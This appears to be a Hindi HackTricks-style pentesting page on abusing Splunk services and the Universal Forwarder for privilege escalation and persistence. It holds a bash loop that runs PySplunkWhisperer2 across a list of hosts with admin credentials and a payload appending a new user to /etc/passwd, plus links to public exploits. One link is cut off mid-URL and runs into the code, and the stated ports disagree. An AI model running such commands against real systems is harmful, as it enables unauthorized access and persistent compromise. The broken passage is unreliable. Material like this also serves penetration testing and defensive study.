# Splunk LPE और स्थिरता

{{#include ../../banners/hacktricks-training.md}}

यदि **आंतरिक** या **बाहरी** रूप से किसी मशीन का **गणना** करते समय आपको **Splunk चलाते हुए** (पोर्ट 8090) मिलता है, और यदि आपको किसी **मान्य क्रेडेंशियल** के बारे में पता है, तो आप **Splunk सेवा का दुरुपयोग** करके **एक शेल** को उस उपयोगकर्ता के रूप में **निष्पादित** कर सकते हैं जो Splunk चला रहा है। यदि रूट इसे चला रहा है, तो आप रूट तक विशेषाधिकार बढ़ा सकते हैं।

यदि आप **पहले से ही रूट हैं और Splunk सेवा केवल लोकलहोस्ट पर सुन नहीं रही है**, तो आप **Splunk सेवा से** **पासवर्ड** फ़ाइल **चुरा सकते हैं** और पासवर्ड को **क्रैक** कर सकते हैं, या इसमें **नए** क्रेडेंशियल **जोड़ सकते हैं**। और होस्ट पर स्थिरता बनाए रख सकते हैं।

नीचे पहले चित्र में आप देख सकते हैं कि एक Splunkd वेब पृष्ठ कैसा दिखता है।

## Splunk यूनिवर्सल फॉरवर्डर एजेंट एक्सप्लॉइट सारांश

अधिक विवरण के लिए पोस्ट देखें [https://eapolsniper.github.io/2020/08
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**उपयोगी सार्वजनिक एक्सप्लॉइट:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Splunk क्वेरी का दुरुपयोग

**अधिक जानकारी के लिए पोस्ट देखें [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
